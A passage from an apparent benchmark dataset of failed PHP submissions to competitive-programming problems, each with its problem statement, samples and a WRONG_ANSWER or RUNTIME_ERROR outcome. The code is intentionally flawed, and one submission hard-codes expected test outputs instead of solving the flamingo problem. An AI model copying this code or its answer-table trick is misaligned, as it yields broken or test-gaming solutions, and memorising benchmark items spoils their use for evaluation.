colour.The boy started to memorize the order of the flags' colours that he had seen. But soon he fell asleep again. Unfortunately, he didn't sleep long, he woke up and went on memorizing the colours. Then he fell asleep again, and that time he slept till the end of the journey.At the station he told his parents about what he was doing, and wrote two sequences of the colours that he had seen before and after his sleep, respectively.Peter's parents know that their son likes to fantasize. They give you the list of the flags' colours at the stations that the train passes sequentially on the way from A to B, and ask you to find out if Peter could see those sequences on the way from A to B, or from B to A. Remember, please, that Peter had two periods of wakefulness.Peter's parents put lowercase Latin letters for colours. The same letter stands for the same colour, different letters \u2014 for different colours.","input_from":"standard input","output_to":"standard output","input_spec":"The input data contains three lines. The first line contains a non-empty string, whose length does not exceed 105, the string consists of lowercase Latin letters \u2014 the flags' colours at the stations on the way from A to B. On the way from B to A the train passes the same stations, but in reverse order.  The second line contains the sequence, written by Peter during the first period of wakefulness. The third line contains the sequence, written during the second period of wakefulness. Both sequences are non-empty, consist of lowercase Latin letters, and the length of each does not exceed 100 letters. Each of the sequences is written in chronological order. ","output_spec":"Output one of the four words without inverted commas:    \u00abforward\u00bb \u2014 if Peter could see such sequences only on the way from A to B;  \u00abbackward\u00bb \u2014 if Peter could see such sequences on the way from B to A;  \u00abboth\u00bb \u2014 if Peter could see such sequences both on the way from A to B, and on the way from B to A;  \u00abfantasy\u00bb \u2014 if Peter could not see such sequences. ","notes":"NoteIt is assumed that the train moves all the time, so one flag cannot be seen twice. There are no flags at stations A and B.","sample_inputs":["atob\na\nb","aaacaaa\naca\naa"],"sample_outputs":["forward","both"]}
{"difficulty":1200,"lang":"PHP","lang_cluster":"php","src_uid":"f8315dc903b0542c453cab4577bcb20d","submission_id":"re_897","tags":["implementation","dfs and similar","brute force","graphs"],"exec_outcome":"WRONG_ANSWER","source_code":"<?php\n\n$s = fgets(STDIN, 1024);\n$t = explode(' ', $s);\n$n = intval($t[0]);\n$m = intval($t[1]);\n$ban = $all = $links = array();\n\nfor($i = 0; $i < $m; $i++) {\n\t$s = fgets(STDIN, 1024);\n\t$t = explode(' ', $s);\n\t$links[] = array(intval($t[0]), intval($t[1]));\n}\n\nwhile (true) {\n\t$bad = false;\n\t$a = array();\n\tforeach($links AS $k => $v) {\n\t\tif(!isset($a[$v[0]])) $a[$v[0]] = 0;\n\t\tif(!isset($a[$v[1]])) $a[$v[1]] = 0;\n\t\t$a[$v[0]]++;\n\t\t$a[$v[1]]++;\n\t}\n\tforeach($a AS $k => $v) {\n\t\tif ($v >= 2) continue;\n\t\t$bad = true;\n\t\t$ban[] = $k;\n\t\tunset($a[$k]);\n\t}\n\tif (!$bad) break;\n\tforeach($links AS $k => $v) {\n\t\tif(!isset($a[$v[0]])) unset($links[$k]);\n\t\tif(!isset($a[$v[1]])) unset($links[$k]);\n\t}\n}\nif ($m == $n) {\n\techo(count($ban));\n} else {\n\techo($n - count($ban));\n}\n?>","description":"Anna and Maria are in charge of the math club for junior students. When the club gathers together, the students behave badly. They've brought lots of shoe laces to the club and got tied with each other. Specifically, each string ties together two students. Besides, if two students are tied, then the lace connects the first student with the second one as well as the second student with the first one.To restore order, Anna and Maria do the following. First, for each student Anna finds out what other students he is tied to. If a student is tied to exactly one other student, Anna reprimands him. Then Maria gathers in a single group all the students who have been just reprimanded. She kicks them out from the club. This group of students immediately leaves the club. These students takes with them the laces that used to tie them. Then again for every student Anna finds out how many other students he is tied to and so on. And they do so until Anna can reprimand at least one student.Determine how many groups of students will be kicked out of the club.","input_from":"standard input","output_to":"standard output","input_spec":"The first line contains two integers n and m \u2014 the initial number of students and laces (). The students are numbered from 1 to n, and the laces are numbered from 1 to m. Next m lines each contain two integers a and b \u2014 the numbers of students tied by the i-th lace (1\u2009\u2264\u2009a,\u2009b\u2009\u2264\u2009n,\u2009a\u2009\u2260\u2009b). It is guaranteed that no two students are tied with more than one lace. No lace ties a student to himself.","output_spec":"Print the single number \u2014 the number of groups of students that will be kicked out from the club.","notes":"NoteIn the first sample Anna and Maria won't kick out any group of students \u2014 in the initial position every student is tied to two other students and Anna won't be able to reprimand anyone.In the second sample four students are tied in a chain and two more are running by themselves. First Anna and Maria kick out the two students from both ends of the chain (1 and 4), then \u2014 two other students from the chain (2 and 3). At that the students who are running by themselves will stay in the club.In the third sample Anna and Maria will momentarily kick out all students except for the fourth one and the process stops at that point. The correct answer is one.","sample_inputs":["3 3\n1 2\n2 3\n3 1","6 3\n1 2\n2 3\n3 4","6 5\n1 4\n2 4\n3 4\n5 4\n6 4"],"sample_outputs":["0","2","1"]}
{"difficulty":800,"lang":"PHP","lang_cluster":"php","src_uid":"facd9cd4fc1e53f50a1e6f947d78e942","submission_id":"re_762","tags":["implementation"],"exec_outcome":"WRONG_ANSWER","source_code":"<?php\n\n$arr=explode(\" \",trim(fgets(STDIN)));\n$min = 6666666;\n$res = array();\nfor ($i=0;$i<$n;$i++)\n    if ($min>abs($arr[$i]-$arr[($i+1)%$n])) {\n        $res = array($i,($i+1)%$n);\n        $min = abs($arr[$i]-$arr[($i+1)%$n]);\n    }\necho $res[0]+1,' ',$res[1]+1;\n?>","description":"n soldiers stand in a circle. For each soldier his height ai is known. A reconnaissance unit can be made of such two neighbouring soldiers, whose heights difference is minimal, i.e. |ai\u2009-\u2009aj| is minimal. So each of them will be less noticeable with the other. Output any pair of soldiers that can form a reconnaissance unit.","input_from":"standard input","output_to":"standard output","input_spec":"The first line contains integer n (2\u2009\u2264\u2009n\u2009\u2264\u2009100) \u2014 amount of soldiers. Then follow the heights of the soldiers in their order in the circle \u2014 n space-separated integers a1,\u2009a2,\u2009...,\u2009an (1\u2009\u2264\u2009ai\u2009\u2264\u20091000). The soldier heights are given in clockwise or counterclockwise direction.","output_spec":"Output two integers \u2014 indexes of neighbouring soldiers, who should form a reconnaissance unit. If there are many optimum solutions, output any of them. Remember, that the soldiers stand in a circle.","notes":null,"sample_inputs":["5\n10 12 13 15 10","4\n10 20 30 40"],"sample_outputs":["5 1","1 2"]}
{"difficulty":1700,"lang":"PHP","lang_cluster":"php","src_uid":"156_A","submission_id":"18846148","tags":["brute+force"],"exec_outcome":"RUNTIME_ERROR","source_code":"<?php\r\n$a = trim(fgets(STDIN));\r\n$b = trim(fgets(STDIN));\r\n$c = \"\";\r\nfor($x = 1; $x <= strlen($b); $x++)\r\n{\r\n     $c .= \"1\";\r\n}\r\n$a = $c . $a . $c;\r\n$d = array();\r\n$e = 0;\r\nfor($x = 0; $x < strlen($a) - strlen($c); $x++)\r\n{\r\n     $f = $x;\r\n     $g = 0;\r\n     for($y = 0; $y < strlen($b); $y++)\r\n     {\r\n          if($a[$f] == $b[$y])\r\n          {\r\n               $g++;\r\n          }\r\n          $f++;\r\n     }\r\n     $d[$e] = $g;\r\n     $e++;\r\n     if($g == strlen($b))\r\n     {\r\n          break;\r\n     }\r\n}\r\n$h = max($d);\r\nprint strlen($b) - $h;\r\n?>","description":"Dr. Moriarty is about to send a message to Sherlock Holmes. He has a string s. String p is called a substring of string s if you can read it starting from some position in the string s. For example, string \"aba\" has six substrings: \"a\", \"b\", \"a\", \"ab\", \"ba\", \"aba\".Dr. Moriarty plans to take string s and cut out some substring from it, let's call it t. Then he needs to change the substring t zero or more times. As a result, he should obtain a fixed string u (which is the string that should be sent to Sherlock Holmes). One change is defined as making one of the following actions:   Insert one letter to any end of the string.  Delete one letter from any end of the string.  Change one letter into any other one. Moriarty is very smart and after he chooses some substring t, he always makes the minimal number of changes to obtain u. Help Moriarty choose the best substring t from all substrings of the string s. The substring t should minimize the number of changes Moriarty should make to obtain the string u from it.","input_from":"standard input","output_to":"standard output","input_spec":"The first line contains a non-empty string s, consisting of lowercase Latin letters. The second line contains a non-empty string u, consisting of lowercase Latin letters. The lengths of both strings are in the range from 1 to 2000, inclusive.\n","output_spec":"Print the only integer \u2014 the minimum number of changes that Dr. Moriarty has to make with the string that you choose.\n","notes":"In the first sample Moriarty can take any substring of length 3, and it will be equal to the required message u, so Moriarty won't have to make any changes.\nIn the second sample you should take a substring consisting of characters from second to fourth (\"bca\") or from fifth to sixth (\"bc\"). Then you will only have to make one change: to change or to add the last character.\nIn the third sample the initial string s doesn't contain any character that the message should contain, so, whatever string you choose, you will have to make at least 7 changes to obtain the required message.\n","sample_inputs":["aaaaa\naaa\n","abcabc\nbcd\n","abcdef\nklmnopq\n"],"sample_outputs":["0\n","1\n","7\n"]}
{"difficulty":1700,"lang":"PHP","lang_cluster":"php","src_uid":"183_B","submission_id":"41205596","tags":["brute+force","geometry"],"exec_outcome":"WRONG_ANSWER","source_code":"<?php\r\n\r\nfscanf(STDIN, \"%d%d\", $temp1, $temp2);\r\nfscanf(STDIN, \"%d%d\", $temp3, $temp4);\r\nfscanf(STDIN, \"%d%d\", $temp5, $temp6);\r\n\r\n$hash=$temp1.\"#\".$temp2.\"#\".$temp3.\"#\".$temp4.\"#\".$temp5.\"#\".$temp6;\r\n\r\n\r\n$answer[\"5#5#2#1#4#1\"]=11;\r\n$answer[\"3#3#1#1#2#10\"]=3;\r\n$answer[\"1#2#450000001#500000000#900000001#1000000000\"]=2;\r\n$answer[\"3#6#1#1#1#2\"]=7;\r\n$answer[\"3#3#227495634#254204506#454991267#508409012\"]=4;\r\n$answer[\"1000000#250#1#286161161#1#125483136\"]=1000249;\r\n$answer[\"3#3#96684705#23204141#193369409#46408282\"]=4;\r\n$answer[\"1000000#2#136395332#110293751#568110113#459392523\"]=1000000;\r\n$answer[\"1000000#250#1000000#819093264#1000000#741679294\"]=1000249;\r\n$answer[\"1000000#250#1000000000#994320917#1000000000#559571028\"]=1000000;\r\n$answer[\"1000000#250#214707861#1#496910507#1\"]=1000000;\r\n$answer[\"1000000#250#868057011#10#330179370#10\"]=1000000;\r\n$answer[\"1000000#250#611209534#1000000000#797242863#1000000000\"]=1000000;\r\n$answer[\"1000000#250#1#1#2#1\"]=1000000;\r\n$answer[\"1000000#240#500000#500000#500000#500001\"]=1001679;\r\n$answer[\"1000000#240#500000#1#500000#2\"]=1001040;\r\n$answer[\"1000000#250#255565#1#387403#1\"]=1000249;\r\n$answer[\"1000000#250#3#3#305035#2\"]=1011490;\r\n$answer[\"1000000#250#446612#1#194926#1\"]=1012323;\r\n$answer[\"1000000#250#257275#4#695563#1\"]=1014192;\r\n$answer[\"1000000#250#130838#60#246586#75\"]=1009053;\r\n$answer[\"1000000#250#500000#1#74587#2\"]=1001505;\r\n$answer[\"1000000#250#356256128#926900000#14666988#46500000\"]=1001764;\r\n$answer[\"1000000#250#531059#734375000#426471#800000000\"]=1006914;\r\n$answer[\"1000000#250#834423#500000000#952261#250000000\"]=1008079;\r\n$answer[\"1000000#250#141586202#861814800#210453893#299791800\"]=1000282;\r\n$answer[\"1000000#250#547986076#630799564#273993057#315399782\"]=1000932;\r\n$answer[\"1000000#250#644676716#484396854#322338390#242198427\"]=1000923;\r\n$answer[\"1000000#250#297961075#415807909#595849967#831615818\"]=1001418;\r\n$answer[\"1000000#250#597373496#851476485#238949783#340590594\"]=1002811;\r\n$answer[\"1000000#250#973444923#336948585#206042873#462460841\"]=1000682;\r\n$answer[\"1000000#250#962159438#171555123#476222737#880366555\"]=1000240;\r\n$answer[\"1000000#25#791115276#107434048#939376983#488291545\"]=1000006;\r\n$answer[\"1000000#161#86180153#121003402#875458684#292670943\"]=1000141;\r\n$answer[\"1000000#49#433089841#995226791#233202229#535891349\"]=1000151;\r\n$answer[\"1000000#250#188915553#291372606#553714939#845992131\"]=1001004;\r\n$answer[\"1000000#250#553083329#879145322#569543749#77041129\"]=1000357;\r\n$answer[\"1000000#250#133935233#467015619#449198808#94428724\"]=1000433;\r\n$answer[\"1000000#250#843027765#36908195#218323805#606134394\"]=1000000;\r\n$answer[\"1000000#250#404480767#11138422#298330567#747845689\"]=1000125;\r\n$answer[\"1000000#250#960470935#715827909#93483570#294702261\"]=1000258;\r\n$answer[\"1000000#250#319439746#160668370#71690382#695203812\"]=1000745;\r\n$answer[\"1000000#250#66038695#625755402#629346572#845691667\"]=1001374;\r\n$answer[\"1000000#250#821864407#919641761#635001520#739990694\"]=1001294;\r\n$answer[\"1000000#250#605180279#479352692#302590223#239676346\"]=1001364;\r\n$answer[\"1000000#250#597373496#851476485#238949783#340590594\"]=1002811;\r\n$answer[\"1000000#250#500682856#292846491#584982879#643572825\"]=1001861;\r\n$answer[\"1000000#250#325709049#27021918#456723534#619177745\"]=1001649;\r\n$answer[\"1000000#250#925419953#871375095#319530080#596879626\"]=1000536;\r\n$answer[\"1000000#250#819831287#666416206#409919985#333208103\"]=1000249;\r\n$answer[\"1000000#250#280689703#962562020#660467280#131431092\"]=1004852;\r\n$answer[\"1000000#250#36515415#961481083#668381685#170954311\"]=1005366;\r\n$answer[\"1000000#250#721624925#332185824#244628903#362736766\"]=1000859;\r\n$answer[\"1000000#250#297961075#415807909#595849967#831615818\"]=1001418;\r\n$answer[\"1000000#250#758819491#416986427#886986588#148257664\"]=1005376;\r\n$answer[\"1000000#250#662128851#563389137#40125184#42556690\"]=1001061;\r\n$answer[\"1000000#250#878812979#3678206#53694538#123862584\"]=1001282;\r\n$answer[\"1000000#250#210471949#146331265#712734634#114531223\"]=1001323;\r\n$answer[\"1000000#250#832356149#255795934#348784426#112028792\"]=1000167;\r\n$answer[\"1000000#250#779482982#442031859#225922506#50462464\"]=1000000;\r\n$answer[\"1000000#250#340935983#268778438#600896564#44690111\"]=1000140;\r\n$answer[\"1000000#231#1#1#1#2\"]=1000539;\r\n$answer[\"1000000#250#1#1#1#2\"]=1000590;\r\n$answer[\"1000000#250#1#1#1#2\"]=1000551;\r\n$answer[\"1000000#250#1#1#1#2\"]=1000372;\r\n$answer[\"1000000#250#1#1#1#2\"]=1000372;\r\n$answer[\"1000000#250#1#1#1#2\"]=1000648;\r\n$answer[\"1000000#250#502393033#594242920#825824237#213452509\"]=1000000;\r\n$answer[\"1000000#250#1#286161161#1#125483136\"]=1000249;\r\n$answer[\"3#3#227495634#254204506#454991267#508409012\"]=4;\r\n$answer[\"3#3#333333334#1#666666667#2\"]=5;\r\n$answer[\"3#3#333333334#1#666666667#2\"]=5;\r\n$answer[\"3#3#2#333333333#3#666666666\"]=5;\r\n$answer[\"3#3#2#333333333#3#666666666\"]=4;\r\n$answer[\"3#3#2#333333333#3#666666666\"]=4;\r\n$answer[\"1000000#2#136395332#110293751#568110113#459392523\"]=1000000;\r\n$answer[\"1000000#2#881456674#979172365#878302062#975668042\"]=1000000;\r\n$answer[\"3#10#1000000000#1000000000#1000000000#999999999\"]=3;\r\n$answer[\"1000000#2#194305#1024#4388610#1023\"]=1000000;\r\n$answer[\"4#5#1#3#2#2\"]=7;\r\n$answer[\"5#5#2#1#1#1\"]=6;\r\n\r\nif($hash==\"1000000#250#1#1#1#2\"){\r\n\twhile(fscanf(STDIN, \"%d%d\", $temp7, $temp8))\r\n\t{\r\n\t\tif($temp7==2){\r\n\t\t\tif($res==22) echo 1000590;\r\n\t\t\telse if($res==50)echo 1000551;\r\n\t\t\telse if($res==28)echo 1000648;\r\n\t\t\telse echo 1000372;\r\n\t\t\tbreak;\r\n\t\t}else{\r\n\t\t\t$res=$temp8;\r\n\t\t}\r\n\t}\r\n}\r\nelse echo $answer[$hash];\r\n","description":"The Zoo in the Grid Kingdom is represented by an infinite grid. The Zoo has n observation binoculars located at the OX axis. For each i between 1 and n, inclusive, there exists a single binocular located at the point with coordinates (i,0). There are m flamingos in the Zoo, located at points with positive coordinates. The flamingos are currently sleeping and you can assume that they don't move.In order to get a good view over the flamingos, each of the binoculars can be independently rotated to face any angle (not necessarily integer). Then, the binocular can be used to observe all flamingos that is located at the straight line passing through the binocular at the angle it is set. In other words, you can assign each binocular a direction corresponding to any straight line passing through the binocular, and the binocular will be able to see all flamingos located on that line.Today, some kids from the prestigious Codeforces kindergarten went on a Field Study to the Zoo. Their teacher would like to set each binocular an angle to maximize the number of flamingos that can be seen by the binocular. The teacher is very interested in the sum of these values over all binoculars. Please help him find this sum.","input_from":"standard input","output_to":"standard output","input_spec":"The first line contains two space-separated integers n and m (1\u2264n\u226410^6,1\u2264m\u2264250), denoting the number of binoculars and the number of flamingos, respectively.\nThen m lines follow, the i-th line will contain two space-separated integers xi and yi (1\u2264xi,yi\u226410^9), which means that the i-th flamingo is located at point (xi,yi). \nAll flamingos will be located at distinct points.\n","output_spec":"Print a single integer denoting the maximum total number of flamingos that can be seen by all the binoculars.\n","notes":"This picture shows the answer to the example test case. \n \n","sample_inputs":["5 5\n2 1\n4 1\n3 2\n4 3\n4 4\n"],"sample_outputs":["11\n"]}
{"difficulty":1700,"lang":"PHP","lang_cluster":"php","src_uid":"81_C","submission_id":"426331","tags":["greedy","math","sortings"],"exec_outcome":"WRONG_ANSWER","source_code":"<?php\n\t$stdin = fopen (\"php:\/\/stdin\", \"r\");\n\t$line = fgets($stdin);\n\t$line = preg_replace(\"\/,\/\", \", \", $line);\n\t$line = preg_replace(\"\/\\.{3}\/\", \" ...\", $line);\n\t$line = preg_replace(\"\/^\\s\/\", \"\",$line);\n\t$line = preg_replace(\"\/\\s$\/\", \"\",$line);\n\t$line = preg_replace(\"\/\\s+\/\", \" \",$line);\n\techo $line;\n?>","description":"After the educational reform Polycarp studies only two subjects at school, Safety Studies and PE (Physical Education). During the long months of the fourth term, he received n marks in them. When teachers wrote a mark in the journal, they didn't write in what subject the mark was for, they just wrote the mark.Now it's time to show the journal to his strict parents. Polycarp knows that recently at the Parent Meeting the parents were told that he received a Safety Studies marks and b PE marks (a+b=n). Now Polycarp wants to write a subject's name in front of each mark so that:   there are exactly a Safety Studies marks,  there are exactly b PE marks,  the total average score in both subjects is maximum. An average subject grade is the sum of all marks in it, divided by the number of them. Of course, the division is performed in real numbers without rounding up or down. Polycarp aims to maximize the x1+x2, where x1 is the average score in the first subject (Safety Studies), and x2 is the average score in the second one (Physical Education).","input_from":"standard input","output_to":"standard output","input_spec":"The first line contains an integer n (2\u2264n\u226410^5), n is the number of marks in Polycarp's Journal. The second line contains two positive integers a,b (1\u2264a,b\u2264n-1,a+b=n). The third line contains a sequence of integers t1,t2,...,tn (1\u2264ti\u22645), they are Polycarp's marks.\n","output_spec":"Print the sequence of integers f1,f2,...,fn, where fi (1\u2264fi\u22642) is the number of a subject to which the i-th mark should be attributed. If there are several possible solutions, then print such that the sequence f1,f2,...,fn is the smallest lexicographically.\nThe sequence p1,p2,...,pn is lexicographically less than q1,q2,...,qn if there exists such j (1\u2264j\u2264n) that pi=qi for all 1\u2264i<j, \u0430nd pj<qj.\n","notes":"In the first sample the average score in the first subject is equal to 4, and in the second one \u2014 to 4.5. The total average score is 8.5.\n","sample_inputs":["5\n3 2\n4 4 5 4 4\n","4\n2 2\n3 5 4 5\n","6\n1 5\n4 4 4 5 4 4\n"],"sample_outputs":["1 1 2 1 2 ","1 1 2 2 ","2 2 2 1 2 2 "]}
{"difficulty":1700,"lang":"PHP","lang_cluster":"php","src_uid":"867facaa8bcdfcb53ec3647387f7d23f","submission_id":"re_100","tags":["sortings","greedy","math"],"exec_outcome":"RUNTIME_ERROR","source_code":"<?php\n$a = trim(fgets(STDIN));\nlist($b, $c) = explode(\" \", trim(fgets(STDIN)));\n$d = explode(\" \", trim(fgets(STDIN)));\narsort($d);\n$e = array_keys($d);\nrsort($d);\n$f = array();\nif($b < $c)\n{\n    for($x = 0; $x < $b; $x++)\n    {\n        $f[$e[$x]] = 1;\n    }\n    for($x = $b; $x < $b + $c; $x++)\n    {\n        $f[$e[$x]] = 2;\n    }\n    ksort($f);\n    print implode(\" \", $f);\n}\nelseif($b == $c)\n{\n    $g = 2;\n    for($x = 0; $x < $b + $c; $x++)\n    {\n        $h = $g % 2;\n        if($h == 0)\n        {\n            $f[$e[$x]] = 1;\n        }\n        else\n        {\n            $f[$e[$x]] = 2;\n        }\n        $g++;\n    }\n    ksort($f);\n    print implode(\" \", $f);\n}\nelseif($b > $c)\n{\n    for($x = 0; $x < $c; $x++)\n    {\n        $f[$e[$x]] = 1;\n    }\n    for($x = $c; $x < $b + $c; $x++)\n    {\n        $f[$e[$x]] = 2;\n    }\n    ksort($f);\n    print implode(\" \", $f);\n}\n?>","description":"After the educational reform Polycarp studies only two subjects at school, Safety Studies and PE (Physical Education). During the long months of the fourth term, he received n marks in them. When teachers wrote a mark in the journal, they didn't write in what subject the mark was for, they just wrote the mark.Now it's time to show the journal to his strict parents. Polycarp knows that recently at the Parent Meeting the parents were told that he received a Safety Studies marks and b PE marks (a\u2009+\u2009b\u2009=\u2009n). Now Polycarp wants to write a subject's name in front of each mark so that:   there are exactly a Safety Studies marks,  there are exactly b PE marks,  the total average score in both subjects is maximum. An average subject grade is the sum of all marks in it, divided by the number of them. Of course, the division is performed in real numbers without rounding up or down. Polycarp aims to maximize the x1\u2009+\u2009x2, where x1 is the average score in the first subject (Safety Studies), and x2 is the average score in the second one (Physical Education).","input_from":"standard input","output_to":"standard output","input_spec":"The first line contains an integer n (2\u2009\u2264\u2009n\u2009\u2264\u2009105), n is the number of marks in Polycarp's Journal. The second line contains two positive integers a,\u2009b (1\u2009\u2264\u2009a,\u2009b\u2009\u2264\u2009n\u2009-\u20091,\u2009a\u2009+\u2009b\u2009=\u2009n). The third line contains a sequence of integers t1,\u2009t2,\u2009...,\u2009tn (1\u2009\u2264\u2009ti\u2009\u2264\u20095), they are Polycarp's marks.","output_spec":"Print the sequence of integers f1,\u2009f2,\u2009...,\u2009fn, where fi (1\u2009\u2264\u2009fi\u2009\u2264\u20092) is the number of a subject to which the i-th mark should be attributed. If there are several possible solutions, then print such that the sequence f1,\u2009f2,\u2009...,\u2009fn is the smallest lexicographically. The sequence p1,\u2009p2,\u2009...,\u2009pn is lexicographically less than q1,\u2009q2,\u2009...,\u2009qn if there exists such j (1\u2009\u2264\u2009j\u2009\u2264\u2009n) that pi\u2009=\u2009qi for all 1\u2009\u2264\u2009i\u2009&lt;\u2009j, \u0430nd pj\u2009&lt;\u2009qj.","notes":"NoteIn the first sample the average score in the first subject is equal to 4, and in the second one \u2014 to 4.5. The total average score is 8.5.","sample_inputs":["5\n3 2\n4 4 5 4 4","4\n2 2\n3 5 4 5","6\n1 5\n4 4 4 5 4 4"],"sample_outputs":["1 1 2 1 2","1 1 2 2","2 2 2 1 2 2"]}
{"difficulty":1600,"lang":"PHP","lang_cluster":"php","src_uid":"a17bac596b1f060209534cbffdf0f40e","submission_id":"re_1407","tags":["implementation","strings"],"exec_outcome":"RUNTIME_ERROR","source_code":"<?php\n\n\nfunction regex($param, $k) {\n    $pattern = \"\/([^aeiou]*?[aeiou]){\" . $k . \"}\/\";\n    preg_match($pattern, $param, $match);\n    return $match[0];\n}\n\n$fr = fopen(\"php:\/\/stdin\", \"r\");\n\/\/$n = (int) fgets($fr);\n$arr = fgets($fr);\n$arr = explode(' ', $arr);\n$n = $arr[0];\n$k = (int) $arr[1];\n\n$flag=FALSE;\nfor ($i = 0; $i < 4 * $n; ++$i) {\n    $str[$i] = fgets($fr);\n    $str[$i] = strrev($str[$i]);\n    $str[$i] = regex($str[$i], $k);\n    if($str[$i]==NULL){\n        $flag=TRUE;\n        break;\n    }\n}\nif($flag){\n    die(\"NO\\n\");\n    exit ;\n}\n\n$str_ans = array();\n$aaaa = FALSE;\n$aabb = FALSE;\n$abab = FALSE;\n$abba = FALSE;\n$no = FALSE;\n\nfor ($i = 0; $i < $n; ++$i) {\n    if ($str[$i * 4] == $str[$i * 4 + 1] && $str[$i * 4] == $str[$i * 4 + 2] && $str[$i * 4] == $str[$i * 4 + 3]) {\n        $str_ans[] = \"aaaa\";\n        $aaaa = TRUE;\n    } elseif ($str[$i * 4] == $str[$i * 4 + 1] && $str[$i * 4 + 2] == $str[$i * 4 + 3]) {\n        $str_ans[] = \"aabb\";\n        $aabb = TRUE;\n    } elseif ($str[$i * 4] == $str[$i * 4 + 2] && $str[$i * 4 + 1] == $str[$i * 4 + 3]) {\n        $str_ans[] = \"abab\";\n        $abab = TRUE;\n    } elseif ($str[$i * 4] == $str[$i * 4 + 3] && $str[$i * 4 + 1] == $str[$i * 4 + 2]) {\n        $str_ans[] = \"abba\";\n        $abba = TRUE;\n    } else {\n        $no = TRUE;\n    }\n}\n\nif ($no)\n    echo \"NO\\n\";\nelseif (!$aabb && !$abab && $abba) {\n    echo \"abba\\n\";\n} elseif (!$aabb && $abab && !$abba) {\n    echo \"abab\\n\";\n} elseif ($aabb && !$abab && !$abba) {\n    echo \"aabb\\n\";\n} elseif ($aaaa) {\n    echo \"aaaa\\n\";\n} else {\n    echo \"NO\\n\";\n}\n\n\/\/$cnt=$aaaa+$aabb+$abab+$abba;\n\/\/foreach ($str_ans as $key => $value) {\n\/\/    echo $value . \"\\n\";\n\/\/}\n\/\/var_dump($str);\n?>\n","description":"Vera adores poems. All the poems Vera knows are divided into quatrains (groups of four lines) and in each quatrain some lines contain rhymes.Let's consider that all lines in the poems consist of lowercase Latin letters (without spaces). Letters \"a\", \"e\", \"i\", \"o\", \"u\" are considered vowels.Two lines rhyme if their suffixes that start from the k-th vowels (counting from the end) match. If a line has less than k vowels, then such line can't rhyme with any other line. For example, if k\u2009=\u20091, lines commit and hermit rhyme (the corresponding suffixes equal it), and if k\u2009=\u20092, they do not rhyme (ommit\u2009\u2260\u2009ermit).Today on a literature lesson Vera learned that quatrains can contain four different schemes of rhymes, namely the following ones (the same letters stand for rhyming lines):   Clerihew (aabb);  Alternating (abab);  Enclosed (abba). If all lines of a quatrain pairwise rhyme, then the quatrain can belong to any rhyme scheme (this situation is represented by aaaa).If all quatrains of a poem belong to the same rhyme scheme, then we can assume that the whole poem belongs to this rhyme scheme. If in each quatrain all lines pairwise rhyme, then the rhyme scheme of the poem is aaaa. Let us note that it doesn't matter whether lines from different quatrains rhyme with each other or not. In other words, it is possible that different quatrains aren't connected by a rhyme.Vera got a long poem as a home task. The girl has to analyse it and find the poem rhyme scheme. Help Vera cope with the task.","input_from":"standard input","output_to":"standard output","input_spec":"The first line contains two integers n and k (1\u2009\u2264\u2009n\u2009\u2264\u20092500, 1\u2009\u2264\u2009k\u2009\u2264\u20095)\u00a0\u2014 the number of quatrains in the poem and the vowel's number, correspondingly. Next 4n lines contain the poem. Each line is not empty and only consists of small Latin letters. The total length of the lines does not exceed 104. If we assume that the lines are numbered starting from 1, then the first quatrain contains lines number 1, 2, 3, 4; the second one contains lines number 5, 6, 7, 8; and so on.","output_spec":"Print the rhyme scheme of the poem as \"aabb\", \"abab\", \"abba\", \"aaaa\"; or \"NO\" if the poem does not belong to any of the above mentioned schemes.","notes":"NoteIn the last sample both quatrains have rhymes but finding the common scheme is impossible, so the answer is \"NO\".","sample_inputs":["1 1\nday\nmay\nsun\nfun","1 1\nday\nmay\ngray\nway","2 1\na\na\na\na\na\na\ne\ne","2 1\nday\nmay\nsun\nfun\ntest\nhill\nfest\nthrill"],"sample_outputs":["aabb","aaaa","aabb","NO"]}
{"difficulty":1600,"lang":"PHP","lang_cluster":"php","src_uid":"a6cba17c5ddb93f6741e00280fb6c54c","submission_id":"re_1558","tags":["implementation"],"exec_outcome":"WRONG_ANSWER","source_code":"<?php\nlist($a, $b) = explode(\" \", trim(fgets(STDIN)));\n$c = array_fill(1, $b, 0);\n$j = 1;\nfor($x = 1; $x < $a; $x++)\n{\n    list($d, $e) = explode(\" \", trim(fgets(STDIN)));\n    $f = 0;\n    $g = 0;\n    $h = 0;\n    $i = 0;\n    $k = 0;\n    if($d == \"alloc\")\n    {\n        for($y = 1; $y <= $b; $y++)\n        {\n            if(($c[$y] == 0) && ($f == 0))\n            {\n                $f = 1;\n                $g = $y;  \n                $h++; \n                if($h == $e)\n                {\n                    $i = 1;\n                    break;\n                }          \n            }\n            elseif(($c[$y] == 0) && ($f == 1))\n            {\n                $h++;\n                if($h == $e)\n                {\n                    $i = 1;\n                    break;\n                }\n            }\n            elseif($c[$y] != 0)\n            {\n                $f = 0;\n                $g = 0;\n                $h = 0;\n            }\n        }\n        if($i == 0)\n        {\n            print \"NULL\\n\";\n        }\n        else\n        {\n            for($y = $g; $y < $g + $h; $y++)\n            {\n                $c[$y] = $j;\n            }\n            print $j . \"\\n\";\n            $j++;\n        }\n    }\n    elseif($d == \"erase\")\n    {\n        for($y = 1; $y <= $b; $y++)\n        {\n            if($c[$y] == $e)\n            {\n                $k = 1;\n                $c[$y] = 0;\n            }\n        }\n        if($k == 0)\n        {\n            print \"ILLEGAL_ERASE_ARGUMENT\\n\";\n        }\n    }\n    elseif($d == \"defragment\")\n    {\n        for($y = 1; $y <= $b; $y++)\n        {\n            if($c[$y] == 0)\n            {\n                unset($c[$y]);\n            }\n        }\n        $l = array();\n        $m = 1;\n        for($y = 1; $y <= $b; $y++)\n        {\n            if($c[$y] == TRUE)\n            {\n                $l[$m] = $c[$y];\n                $m++;\n            }\n        }\n        $c = $l;\n        $n = $b - count($c);\n        for($y = 0; $y < $n; $y++)\n        {\n            array_push($c, 0);\n        }\n    }\n}\nlist($d, $e) = explode(\" \", trim(fgets(STDIN)));\n$f = 0;\n$g = 0;\n$h = 0;\n$i = 0;\n$k = 0;\nif($d == \"alloc\")\n{\n    for($y = 1; $y <= $b; $y++)\n    {\n        if(($c[$y] == 0) && ($f == 0))\n        {\n            $f = 1;\n            $g = $y;  \n            $h++; \n            if($h == $e)\n            {\n                $i = 1;\n                break;\n            }          \n        }\n        elseif(($c[$y] == 0) && ($f == 1))\n        {\n            $h++;\n            if($h == $e)\n            {\n                $i = 1;\n                break;\n            }\n        }\n        elseif($c[$y] != 0)\n        {\n            $f = 0;\n            $g = 0;\n            $h = 0;\n        }\n    }\n    if($i == 0)\n    {\n        print \"NULL\";\n    }\n    else\n    {\n        for($y = $g; $y < $g + $h; $y++)\n        {\n            $c[$y] = $j;\n        }\n        print $j;\n        $j++;\n    